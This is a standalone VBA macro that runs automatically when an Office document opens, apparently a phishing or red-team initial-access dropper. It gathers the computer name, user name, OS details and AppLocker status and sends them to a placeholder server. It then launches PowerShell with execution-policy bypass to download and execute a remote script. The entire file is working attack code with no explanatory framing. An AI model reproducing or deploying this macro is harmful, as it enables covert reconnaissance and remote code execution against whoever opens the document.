Sub AutoOpen()
    Dim strServer As String
    strServer = "http://192.168.xxx.xxx/"

    ' Send host information to server
    Dim objHTTP As Object
    Dim strInfoURL As String
    
    Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
    strInfoURL = strServer & Get_HostInformation

    objHTTP.Open "GET", strInfoURL, False
    objHTTP.Send

    If objHTTP.Status = 200 Then
        ' Create WScript shell object
        Dim objShell As Object
        Set objShell = CreateObject("WScript.Shell")
        ' Run PowerShell and invoke remote script on server
        objShell.Run "powershell -exec bypass -c IEX(Invoke-WebRequest -Uri """ & strServer & "files/xxx.ps1"" -UseBasicParsing)"
    End If
End Sub

Public Function Get_HostInformation() As String
    Dim strComputerName As String
    Dim strUserName As String
    Dim strCaption As String
    Dim strOSArchitecture As String
    Dim strBuildNumber As String
    Dim boolApplocker As Boolean

    strComputerName = Environ("COMPUTERNAME")
    strUserName = Environ("USERNAME")
    strCaption = WMI_GetOSProperty("Caption")
    strOSArchitecture = WMI_GetOSProperty("OSArchitecture")
    strBuildNumber = WMI_GetOSProperty("BuildNumber")
    boolApplocker = AppLockerEnabled

    Get_HostInformation = "?ComputerName=" & strComputerName & _
                          "&UserName=" & strUserName & _
                          "&Caption=" & strCaption & _
                          "&OSArchitecture=" & strOSArchitecture & _
                          "&BuildNumber=" & strBuildNumber & _
                          "&Applocker=" & boolApplocker
End Function

Public Function WMI_GetOSProperty(sPropertyName As String) As String
    On Error GoTo Error_Handler
        Dim oWMI                  As Object    'SWbemServicesEx 'WMI object to query about the PC's OS
        Dim sWMIQuery             As String    'WMI Query
        Dim oCols                 As Object    'SWbemServicesObjectSet
        Dim oCol                  As Object    'SWbemObjectEx

        Set oWMI = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
        sWMIQuery = "SELECT " & sPropertyName & " FROM Win32_OperatingSystem"
        Set oCols = oWMI.ExecQuery(sWMIQuery)
        WMI_GetOSProperty = oCols.ItemIndex(0).Properties_(sPropertyName)

Error_Handler_Exit:
        On Error Resume Next
        Set oCols = Nothing
        Set oWMI = Nothing
        Exit Function

Error_Handler:
        If Err.Number = -2147217385 Then
            'Invalid query - Property doesn't exist
        Else
            MsgBox "The following error has occurred" & vbCrLf & vbCrLf & _
                "Error Number: " & Err.Number & vbCrLf & _
                "Error Source: WMI_GetOSProperty" & vbCrLf & _
                "Error Description: " & Err.Description & _
                Switch(Erl = 0, "", Erl <> 0, vbCrLf & "Line No: " & Erl) _
                , vbOKOnly + vbCritical, "An Error has Occurred!"
        End If
        Resume Error_Handler_Exit
End Function

Public Function AppLockerEnabled() As Boolean
Dim wmiService As Object
    Dim query As String
    Dim services As Object
    Dim service As Object
    
    ' Create a new WMI service object
    Set wmiService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
    
    ' Set the WMI query to retrieve the AppIDSvc service
    query = "SELECT * FROM Win32_Service WHERE Name = 'AppIDSvc'"
    
    ' Execute the WMI query
    Set services = wmiService.ExecQuery(query)
    
    ' Check if the AppIDSvc service is found
    If services.Count > 0 Then
        ' Iterate through the services
        For Each service In services
            ' Check if the service is running
            If service.State = "Running" Then
                AppLockerEnabled = True
                Exit For
            End If
        Next service
    End If
End Function
